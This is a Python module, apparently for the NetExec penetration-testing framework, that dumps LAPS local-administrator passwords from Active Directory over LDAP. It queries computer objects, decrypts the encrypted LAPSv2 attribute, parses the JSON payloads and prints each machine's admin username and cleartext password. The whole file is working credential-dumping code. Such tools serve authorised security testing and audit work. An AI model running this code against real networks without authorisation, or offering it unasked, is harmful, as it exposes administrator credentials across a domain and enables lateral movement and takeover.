import json
from dataclasses import dataclass, field

from ldap3.utils.conv import escape_filter_chars

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.playbooks.results import ActionResult, ResultStatus
from nxc.protocols.ldap.laps import LAPSv2Extract


class NXCModule:
    """Read LAPS passwords, preserving each computer's source and decode outcome."""

    name = "laps"
    description = "Retrieves all LAPS passwords which the account has read permissions for."
    supported_protocols = ["ldap"]
    category = CATEGORY.CREDENTIAL_DUMPING

    @dataclass
    class ComputerPassword:
        computer: str | None
        dns_hostname: str | None
        dn: str | None
        source: str | None = None
        username: str | None = None
        password: str | None = None
        attributes: dict = field(default_factory=dict)
        error: str | None = None

    @dataclass
    class ResultData:
        computer_filter: str | None
        computers: list = field(default_factory=list)

    result_type = ResultData

    def options(self, context, module_options):
        """COMPUTER    Computer name or wildcard ex: WIN-S10, WIN-* etc. Default: *"""
        self.computer = module_options.get("COMPUTER")

    def decode_password(self, record, values, connection):
        """Decode the password payload after ordinary LDAP attribute parsing."""
        if "mslaps-encryptedpassword" in values:
            record.source = "msLAPS-EncryptedPassword"
            payload = LAPSv2Extract(values["mslaps-encryptedpassword"], connection.username or "", connection.password or "", connection.domain, connection.nthash or "", connection.kerberos, connection.kdcHost, 339, connection.dns_server).run()
            if not payload:
                raise ValueError("Encrypted LAPS password could not be decrypted")
        elif "mslaps-password" in values:
            record.source = "msLAPS-Password"
            payload = values["mslaps-password"]
        elif "ms-mcs-admpwd" in values:
            record.source = "ms-MCS-AdmPwd"
            if not isinstance(values["ms-mcs-admpwd"], str) or not values["ms-mcs-admpwd"]:
                raise ValueError("Legacy LAPS password is not a nonempty string")
            record.password = values["ms-mcs-admpwd"]
            return
        else:
            return
        decoded = json.loads(payload)
        if not isinstance(decoded, dict) or not isinstance(decoded.get("n"), str) or not decoded["n"] or not isinstance(decoded.get("p"), str) or not decoded["p"]:
            raise ValueError("LAPS JSON must contain nonempty account name and password strings")
        record.username, record.password = decoded["n"], decoded["p"]

    def on_login(self, context, connection):
        context.log.display("Getting LAPS Passwords")
        # Retain the documented '*' wildcard while escaping other LDAP syntax.
        name_filter = "(name=" + "*".join(escape_filter_chars(part) for part in self.computer.split("*")) + ")" if self.computer is not None else ""
        search_filter = f"(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*)){name_filter})"
        rows = parse_result_attributes(connection.search(search_filter, ["msLAPS-EncryptedPassword", "msLAPS-Password", "ms-MCS-AdmPwd", "msLAPS-PasswordExpirationTime", "ms-MCS-AdmPwdExpirationTime", "sAMAccountName", "dNSHostName", "distinguishedName"], 0))
        data = self.ResultData(self.computer)
        errors = [connection.last_search_error] if connection.last_search_error else []
        for attributes in rows:
            values = {key.lower(): value for key, value in attributes.items()}
            record = self.ComputerPassword(values.get("samaccountname"), values.get("dnshostname"), values.get("distinguishedname"), attributes=attributes)
            data.computers.append(record)
            # Decryption and JSON payload errors are distinct from LDAP searches.
            try:
                self.decode_password(record, values, connection)
            except Exception as e:
                record.error = str(e) or type(e).__name__
                errors.append(f"{record.computer}: {record.error}")
            if record.password is not None:
                context.log.highlight(f"Computer:{record.computer} User:{record.username or '':<15} Password:{record.password}")
        data.computers.sort(key=lambda record: record.computer or "")
        for error in errors:
            context.log.fail(error)
        available = any(record.password is not None for record in data.computers)
        if not available and not errors:
            context.log.display("No readable LAPS passwords returned")
        return ActionResult("ldap", self.name, connection.host, ResultStatus.FAILED if errors else ResultStatus.SUCCESS if available else ResultStatus.NEGATIVE, data, error="; ".join(errors) or None)
